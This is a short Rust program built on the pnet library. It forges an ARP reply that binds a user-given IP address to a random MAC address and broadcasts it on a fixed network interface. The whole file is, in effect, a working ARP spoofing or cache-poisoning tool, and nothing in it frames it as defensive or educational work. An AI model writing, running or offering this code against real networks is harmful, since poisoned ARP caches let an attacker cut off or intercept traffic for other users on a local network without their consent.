use std::process::exit;
use std::net::Ipv4Addr;

use pnet::datalink::{self, NetworkInterface, MacAddr};
use pnet::packet::ethernet::{MutableEthernetPacket, EtherTypes};
use pnet::packet::arp::{MutableArpPacket, ArpHardwareTypes, ArpOperations};

const IF_NAME: &str = "enp31s0";

#[inline(always)]
fn xorshift64() -> u64 {
    let mut a = unsafe { core::arch::x86_64::_rdtsc() };
    a ^= a << 23;
    a ^= a >> 17;
    a ^= a << 05;

    let mut b = unsafe { core::arch::x86_64::_rdtsc() };
    b ^= b << 13;
    b ^= b >> 18;
    b ^= b << 07;

    a ^= b ^ (b >> 26);

    a + b
}

#[inline(always)]
fn xorshift8() -> u8 {
    (xorshift64() % 255) as u8
}

#[inline(always)]
fn rand_mac() -> MacAddr {
    MacAddr::new(
        xorshift8(),
        xorshift8(),
        xorshift8(),
        xorshift8(),
        xorshift8(),
        xorshift8(),
    )
}

#[inline(always)]
fn send(iface: NetworkInterface, src_ip: Ipv4Addr, dest_ip: Ipv4Addr) {
    let (mut tx, mut _rx) = match datalink::channel(&iface, Default::default()) {
        Ok(datalink::Channel::Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("Unknown channel type"),
        Err(e) => panic!("Error: {}", e),
    };

    let mut arp_buf    = [0u8; 28];
    let mut arp_packet = MutableArpPacket::new(&mut arp_buf).unwrap();
    arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
    arp_packet.set_protocol_type(EtherTypes::Ipv4);
    arp_packet.set_hw_addr_len(6);
    arp_packet.set_proto_addr_len(4);
    arp_packet.set_operation(ArpOperations::Reply);
    arp_packet.set_target_hw_addr(MacAddr::zero());
    arp_packet.set_target_proto_addr(dest_ip);
    arp_packet.set_sender_proto_addr(src_ip);
    arp_packet.set_sender_hw_addr(rand_mac());

    let mut eth_buf    = [0u8; 128];
    let mut eth_packet = MutableEthernetPacket::new(&mut eth_buf).unwrap();
    eth_packet.set_destination(MacAddr::broadcast());
    eth_packet.set_source(rand_mac());
    eth_packet.set_ethertype(EtherTypes::Arp);
    eth_packet.set_payload(&arp_buf);

    tx
        .send_to(&eth_buf, None)
        .unwrap()
        .unwrap();
}

#[inline(always)]
fn to_ip(ip: String) -> Ipv4Addr {
    ip.parse::<Ipv4Addr>()
        .expect(format!("Invalid IP address: {}", ip).as_str())
}

#[inline(always)]
fn usage() {
    let name = std::env::args().nth(0).unwrap();
    println!("Usage: {} <source IP> <destination IP>", name);
    exit(1);
}

#[inline(always)]
fn main() {
    let mut args = std::env::args().skip(1);
    if args.len() == 0 { usage(); }

    // Get the IPs
    let src_ip  = to_ip(args.next().unwrap());
    let dest_ip = to_ip(args.next().unwrap());

    // Get the interface
    let iface   = datalink::interfaces()
        .into_iter()
        .find(|iface| iface.name == IF_NAME)
        .expect(format!("Interface doesn't exist: {}", IF_NAME).as_str());

    send(iface, src_ip, dest_ip);
}
